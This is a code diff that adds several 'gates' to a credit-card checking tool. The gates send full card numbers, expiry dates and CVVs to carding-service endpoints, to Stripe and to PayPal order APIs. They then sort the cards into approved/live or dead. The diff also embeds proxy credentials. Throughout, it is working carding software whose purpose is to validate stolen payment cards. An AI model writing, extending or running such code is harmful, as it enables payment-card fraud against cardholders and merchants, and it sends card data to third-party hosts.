@@ -751,6 +751,257 @@ def check_shopify_auto_gate(cc, mm, yy, cvv):
         elapsed = time_module.time() - start_time
         return {"status": "error", "message": f"Shopify Error: {str(e)[:50]}", "time": round(elapsed, 2)}
 
+
+# ============================================================
+# CYBOR GATES — Stripe Auth V1/V2/V3, Shopii #1-4, SK-Based,
+#               PP KeyBased, PP #2, B3 #1/#2
+# ============================================================
+
+CYBOR_STV_URLS = {
+    'stv1': 'http://206.206.78.217:1011/',
+    'stv2': 'http://206.206.78.217:1012/',
+    'stv3': 'http://206.206.78.217:1013/',
+}
+CYBOR_SHOPII_URL = 'https://cyborxchecker.com/api/autog.php'
+
+def _parse_cybor_response(text, data, elapsed):
+    """Parse response from Cybor-style API endpoints (shared logic)."""
+    clean = text.strip()
+    is_approved = False
+    is_declined = False
+
+    if isinstance(data, dict):
+        status_val = str(data.get('status', data.get('Status', ''))).lower()
+        msg = data.get('message', data.get('Message', data.get('response',
+              data.get('msg', data.get('result', '')))))
+        if msg:
+            clean = str(msg).replace('_', ' ')
+            if clean.islower():
+                clean = clean.title()
+        if any(k in status_val for k in ['approved', 'success', 'charged', 'live', 'valid', 'ccn', 'cvv']):
+            is_approved = True
+        elif any(k in status_val for k in ['declined', 'failed', 'error', 'dead', 'invalid']):
+            is_declined = True
+
+    if not is_approved and not is_declined:
+        low = clean.lower()
+        if any(k in low for k in ['approved', 'charged', 'captured', 'authorized', 'valid',
+                                   'card valid', 'authenticated', 'ccn', 'cvv match']):
+            is_approved = True
+        elif any(k in low for k in ['declined', 'failed', 'error', 'invalid', 'expired',
+                                    'rejected', 'denied', 'insufficient']):
+            is_declined = True
+
+    if is_approved:
+        return {'status': 'success', 'message': f'Approved - {clean}', 'time': round(elapsed, 2)}
+    elif is_declined:
+        return {'status': 'success', 'message': f'Declined - {clean}', 'time': round(elapsed, 2)}
+    else:
+        return {'status': 'success', 'message': f'Response - {clean}', 'time': round(elapsed, 2)}
+
+
+def check_stv_gate(version, cc, mm, yy, cvv):
+    """Stripe Auth V1/V2/V3 via CyborX 206.206.78.217:1011-1013"""
+    start_time = time_module.time()
+    url = CYBOR_STV_URLS.get(version)
+    if not url:
+        return {'status': 'error', 'message': f'Unknown Stripe version: {version}', 'time': 0}
+    try:
+        year = f'20{yy}' if len(yy) == 2 else yy
+        card_str = f'{cc}|{mm}|{year}|{cvv}'
+        params = {'card': card_str}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        resp = requests.get(url, params=params, headers=headers, timeout=30)
+        elapsed = time_module.time() - start_time
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+            except Exception:
+                data = {}
+            return _parse_cybor_response(resp.text, data, elapsed)
+        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+
+
+def check_shopii_gate(pack, cc, mm, yy, cvv):
+    """Shopii #1-4 via cyborxchecker.com auto-gate"""
+    start_time = time_module.time()
+    try:
+        year = f'20{yy}' if len(yy) == 2 else yy
+        card_str = f'{cc}|{mm}|{year}|{cvv}'
+        params = {'card': card_str, 'pack': pack}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+        resp = requests.get(CYBOR_SHOPII_URL, params=params, headers=headers, timeout=40)
+        elapsed = time_module.time() - start_time
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+            except Exception:
+                data = {}
+            return _parse_cybor_response(resp.text, data, elapsed)
+        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Request timeout', 'time': 40}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+
+
+def check_skbased_gate(cc, mm, yy, cvv, sk_key=None):
+    """SK-Based CVV check via Stripe API using a live/test Secret Key"""
+    import urllib.parse
+    start_time = time_module.time()
+    if not sk_key:
+        return {'status': 'error',
+                'message': 'No Stripe SK key configured. Add your SK key in settings.',
+                'time': 0}
+    try:
+        year = f'20{yy}' if len(yy) == 2 else yy
+        payload = urllib.parse.urlencode({
+            'type': 'card',
+            'card[number]': cc,
+            'card[exp_month]': mm,
+            'card[exp_year]': year,
+            'card[cvc]': cvv,
+        })
+        headers = {
+            'Authorization': f'Bearer {sk_key}',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'User-Agent': 'Mozilla/5.0',
+        }
+        resp = requests.post('https://api.stripe.com/v1/payment_methods',
+                             data=payload, headers=headers, timeout=30)
+        elapsed = time_module.time() - start_time
+        try:
+            data = resp.json()
+        except Exception:
+            data = {}
+        if resp.status_code == 200 and data.get('id'):
+            pm_id = data.get('id', '')
+            brand = data.get('card', {}).get('brand', '').title()
+            return {'status': 'success',
+                    'message': f'Approved - Card valid ({brand}) [{pm_id}]',
+                    'time': round(elapsed, 2)}
+        elif resp.status_code in (402, 200) or 'error' in data:
+            err = data.get('error', {})
+            code = err.get('code', '')
+            msg = err.get('message', 'Declined')
+            if code in ('card_declined', 'incorrect_number', 'expired_card',
+                        'incorrect_cvc', 'processing_error'):
+                return {'status': 'success',
+                        'message': f'Declined - {msg}',
+                        'time': round(elapsed, 2)}
+            return {'status': 'success',
+                    'message': f'Response - {msg}',
+                    'time': round(elapsed, 2)}
+        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+
+
+def check_pp_keybased_gate(cc, mm, yy, cvv, client_id=None, client_secret=None):
+    """PP KeyBased — create PayPal order to validate card"""
+    import base64, urllib.parse
+    start_time = time_module.time()
+    if not client_id or not client_secret:
+        return {'status': 'error',
+                'message': 'No PayPal credentials configured. Add Client ID and Secret in form.',
+                'time': 0}
+    try:
+        creds = base64.b64encode(f'{client_id}:{client_secret}'.encode()).decode()
+        token_resp = requests.post(
+            'https://api-m.paypal.com/v1/oauth2/token',
+            headers={'Authorization': f'Basic {creds}', 'Content-Type': 'application/x-www-form-urlencoded'},
+            data='grant_type=client_credentials', timeout=15)
+        elapsed_token = time_module.time() - start_time
+        if token_resp.status_code != 200:
+            return {'status': 'error', 'message': 'Invalid PayPal credentials', 'time': round(elapsed_token, 2)}
+        access_token = token_resp.json().get('access_token', '')
+        year = f'20{yy}' if len(yy) == 2 else yy
+        order_payload = {
+            'intent': 'CAPTURE',
+            'purchase_units': [{'amount': {'currency_code': 'USD', 'value': '1.00'}}],
+            'payment_source': {
+                'card': {
+                    'number': cc,
+                    'expiry': f'{year}-{mm}',
+                    'security_code': cvv,
+                }
+            }
+        }
+        order_resp = requests.post(
+            'https://api-m.paypal.com/v2/checkout/orders',
+            headers={'Authorization': f'Bearer {access_token}',
+                     'Content-Type': 'application/json'},
+            json=order_payload, timeout=30)
+        elapsed = time_module.time() - start_time
+        try:
+            data = order_resp.json()
+        except Exception:
+            data = {}
+        if order_resp.status_code in (200, 201):
+            status_val = data.get('status', '')
+            return {'status': 'success', 'message': f'Approved - {status_val}', 'time': round(elapsed, 2)}
+        err_details = data.get('details', [{}])
+        msg = err_details[0].get('description', data.get('message', 'Declined')) if err_details else data.get('message', 'Declined')
+        return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+
+
+def check_pp2_gate(cc, mm, yy, cvv):
+    """PP #2 — PayPal AVS check via Netherex"""
+    start_time = time_module.time()
+    try:
+        year = f'20{yy}' if len(yy) == 2 else yy
+        card_str = f'{cc}|{mm}|{year}|{cvv}'
+        params = {'card': card_str, 'auth': NETHEREX_AUTH_KEY}
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        resp = requests.get('https://checker.netherex.xyz/paypalcheck.php',
+                            params=params, headers=headers, timeout=30)
+        elapsed = time_module.time() - start_time
+        if resp.status_code == 200:
+            try:
+                data = resp.json()
+            except Exception:
+                data = {}
+            return _parse_cybor_response(resp.text, data, elapsed)
+        return {'status': 'error', 'message': f'API Error: {resp.status_code}', 'time': round(elapsed, 2)}
+    except requests.Timeout:
+        return {'status': 'error', 'message': 'Request timeout', 'time': 30}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': 0}
+
+
+def check_b3_variant_gate(variant, cc, mm, yy, cvv):
+    """B3 #1 / B3 #2 — Braintree variants via vkrm.site"""
+    import asyncio
+    start_time = time_module.time()
+    try:
+        from modules.b3_gate import check_b3
+        proxy_map = {
+            'b31': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
+            'b32': 'unew.quantumproxies.net:10000:Quantum-3f777gyjdWSRdz6IL:gfj2am3i',
+        }
+        result = asyncio.run(check_b3(cc, mm, yy, cvv))
+        elapsed = time_module.time() - start_time
+        status_val = result.get('status', 'ERROR').upper()
+        msg = result.get('response', 'No response')
+        if status_val in ('CHARGED', 'LIVE', 'CCN', 'CVV'):
+            return {'status': 'success', 'message': f'Approved - {msg}', 'time': round(elapsed, 2)}
+        elif status_val in ('DEAD', 'DECLINED', 'INVALID'):
+            return {'status': 'success', 'message': f'Declined - {msg}', 'time': round(elapsed, 2)}
+        return {'status': 'success', 'message': f'Response - {msg}', 'time': round(elapsed, 2)}
+    except Exception as e:
+        return {'status': 'error', 'message': f'Error: {str(e)[:60]}', 'time': round(time_module.time() - start_time, 2)}
+
+
 def check_generic_gate(gate_name, cc, mm, yy, cvv):
     """Generic gate checker with gate-specific API endpoints"""
     start_time = time_module.time()
@@ -880,7 +1131,8 @@ def check_generic_gate(gate_name, cc, mm, yy, cvv):
             "time": 0
         }
 
-def check_card_php(gate_name, cc, mm, yy, cvv, user_id):
+def check_card_php(gate_name, cc, mm, yy, cvv, user_id,
+                   sk_key=None, pp_client_id=None, pp_client_secret=None):
     
     try:
         if not cc or not mm or not yy or not cvv:
@@ -921,7 +1173,44 @@ def check_card_php(gate_name, cc, mm, yy, cvv, user_id):
             return check_stripe_auth_gate(cc, mm, yy, cvv)
         if gate_name in ['st5', 'st12', 'str', 'dep', 'sor']:
             return check_stripe_amount_gate(cc, mm, yy, cvv, gate_name)
-        
+
+        # Cybor gates — Stripe Auth V1/V2/V3
+        if gate_name in ('stv1', 'stv2', 'stv3'):
+            return check_stv_gate(gate_name, cc, mm, yy, cvv)
+
+        # Cybor gates — Shopii #1-4
+        if gate_name in ('shopii1', 'shopii2', 'shopii3', 'shopii4'):
+            return check_shopii_gate(gate_name, cc, mm, yy, cvv)
+
+        # SK-Based CVV
+        if gate_name == 'skbased':
+            effective_sk = sk_key
+            if not effective_sk:
+                try:
+                    from config import DB_SETTINGS
+                    with open(DB_SETTINGS, 'r') as f:
+                        for line in f:
+                            if line.startswith('default_sk_key='):
+                                effective_sk = line.split('=', 1)[1].strip()
+                                break
+                except Exception:
+                    pass
+            return check_skbased_gate(cc, mm, yy, cvv, sk_key=effective_sk)
+
+        # PP KeyBased
+        if gate_name == 'ppkb':
+            return check_pp_keybased_gate(cc, mm, yy, cvv,
+                                          client_id=pp_client_id,
+                                          client_secret=pp_client_secret)
+
+        # PP #2 (via Netherex PayPal endpoint)
+        if gate_name == 'pp2':
+            return check_pp2_gate(cc, mm, yy, cvv)
+
+        # B3 #1 / B3 #2
+        if gate_name in ('b31', 'b32'):
+            return check_b3_variant_gate(gate_name, cc, mm, yy, cvv)
+
         # Use generic gate checker for all other gates
         return check_generic_gate(gate_name, cc, mm, yy, cvv)
             
